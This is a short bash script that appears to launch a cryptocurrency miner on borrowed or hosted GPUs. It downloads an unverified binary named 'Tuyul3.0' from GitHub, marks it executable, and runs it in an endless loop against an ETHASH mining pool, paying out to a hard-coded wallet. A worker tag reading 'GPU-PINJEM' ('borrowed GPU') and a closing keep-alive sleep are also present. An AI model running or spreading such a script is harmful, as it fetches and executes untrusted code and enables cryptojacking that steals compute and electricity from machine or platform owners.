#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=WIN:TP3VKTLcCUbG55R7B5HS41fSFenPV5nZfF
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
wget https://github.com/NRC-TECH/nrc-tech/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
